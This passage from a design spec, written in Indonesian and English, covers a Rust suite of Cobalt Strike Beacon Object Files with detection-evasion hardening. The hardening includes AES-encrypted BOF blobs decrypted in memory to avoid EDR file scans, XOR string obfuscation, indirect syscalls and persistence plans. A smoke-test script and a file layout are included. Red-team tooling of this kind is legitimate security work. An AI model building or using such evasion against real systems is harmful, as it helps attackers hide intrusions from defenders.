| 5 | 30+ BeaconPrintf error strings plaintext | Single error-code enum + minimal release strings | Footprint reduction |
| 6 | BOF loaded dari plaintext file path | New variant `bofx-enc`: AES-128-CBC encrypted blob, decrypt in-memory, parse, execute, zero buf | EDR file-scan avoidance |
| 7 | `.cna` script no preflight | Pre-flight hash whitelist check di .cna | Operator anti-fat-finger |
| 8 | No teardown — mapped sections + DFR table leak in beacon | Explicit `BeaconCleanupProcess` + `VirtualFree` + zero pointers | Beacon memory hygiene |

**Yang TIDAK dimodifikasi** (intentional binary compat):
- `API_TABLE` struct layout & version (binary compat dengan upstream PIC BOFs)
- COFFLoader core logic (well-tested, jangan sentuh parser)
- PE loader (BOF-PE) core logic

**File layout:**

```
tools/inline-execute-ex-opsec/
├── README.md           # credit Dani + upstream 0xTriboulet + TrustedSec COFFLoader
├── src/
│   ├── bof.cpp         # forked, modifikasi #1-#8 di atas
│   ├── coff.h          # copy upstream (unchanged)
│   ├── bofpe.h         # copy upstream (unchanged)
│   ├── beacon.h        # copy upstream (unchanged)
│   ├── api_table.h     # copy upstream (unchanged — binary compat)
│   ├── obfstr.h        # NEW: stack-string XOR macros
│   └── enc_loader.h    # NEW: AES-128-CBC decrypt for bofx-enc variant
├── aggressor/
│   ├── bofx.cna        # banner stripped, command renamed
│   └── bofx-enc.cna    # encrypted blob variant + preflight hash check
├── Makefile            # MinGW cross from macOS → bofx.{x64,x86}.o
└── scripts/
    └── encrypt_bof.py  # AES-encrypt .o → blob for bofx-enc
```

**`scripts/smoke_test.sh` (Layer 3 helper):**

```bash
# Encrypt every Rust BOF
for o in dist/*.x64.o; do
  python3 tools/inline-execute-ex-opsec/scripts/encrypt_bof.py "$o" -o "dist/enc/$(basename "$o").enc"
done

# Operator loads dist/smoke.cna which iterates encrypted blobs via bofx_enc(...)
cat > dist/smoke.cna <<'EOF'
load("tools/inline-execute-ex-opsec/aggressor/bofx-enc.cna");
sub smoke_test {
  local('$bid $bof');
  $bid = $1;
  foreach $bof (matches_files("dist/enc/", "*.enc")) {
    blog($bid, "[smoke] $bof");
    bofx_enc($bid, $bof, "go", "");
    sleep(2000);
  }
}
EOF
```

## 11. Per-BOF acceptance checklist

Setiap crate harus lulus sebelum merge:

- [ ] `crate-type = ["staticlib"]`, `edition = "2024"`, header credit Dani di Cargo.toml + lib.rs
- [ ] `#![no_std]`, `#![cfg_attr(not(test), no_main)]`
- [ ] Entry `#[rustbof::main]` (bukan custom macro)
- [ ] MITRE banner di-print pertama via `common::mitre::print_banner()`
- [ ] Semua Nt*/Zw* lewat `common::syscalls::nt_syscall!` (indirect)
- [ ] Semua Win32 lain lewat `common::dfr::dfr_fn!`; tidak ada `extern "system"` direct di lib.rs BOF
- [ ] Semua string sensitive via `obf!()`
- [ ] Tidak ada `panic!`, `unwrap`, `expect`, `assert!`, `?` di entry function
- [ ] COM resources via `ComRef<T>`/`ComGuard`/`Bstr` RAII
- [ ] `cargo clippy -- -D warnings -D clippy::unwrap_used -D clippy::panic` pass
- [ ] `strings dist/<bof>.x64.o | grep -ciE '<sensitive list>'` == 0
- [ ] Argument parser handle malformed input gracefully (eprintln + return)
- [ ] Output via rustbof `println!`/`eprintln!` (auto-flushed di exit)
- [ ] `docs/mitre-mapping.md` updated dengan technique baru kalau ada

## 12. Out of scope (untuk v0.1.0)

- Driver-level BOF (kernel mode)
- ARM64 Windows target (focus x64+x86 dulu)
- Loader yang men-decrypt over network (offline AES blob saja)
- WMI event consumer persistence (mungkin v0.2 — fokus dulu di task + lnk)
- DCSync, Golden Ticket BOFs (sudah ada di Mimikatz; skip)
- Integration ke C2 framework selain Cobalt Strike (Mythic/Sliver port di v0.2)

## 13. Credits

| Komponen | Author | Lisensi |
|---|---|---|
| Suite (Rust port + OPSEC + persistence) | **Dani** `<daniagungg@gmail.com>` | MIT |
| `rustbof` template | João Victor (`joaoviictorti`) | MIT/Apache-2.0 |
| CS-Situational-Awareness-BOF | TrustedSec | BSD |
| CS-Remote-OPs-BOF | TrustedSec | BSD |
| OperatorsKit | REDMED-X | MIT |
| C2-Tool-Collection | Outflank | BSD |
| InlineExecuteEx | 0xTriboulet | MIT |
| COFFLoader (via InlineExecuteEx) | TrustedSec | BSD |

Setiap source file BOF wajib mencantumkan header SPDX + credit blok:

```rust
// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
// Credit: Rust port + OPSEC hardening — by Dani
// Original C: <upstream repo>/<file>.c — <upstream author>
```

---

**End of design spec.** Implementation plan akan ditulis terpisah pakai `writing-plans` skill, task-by-task dengan checklist tracking.
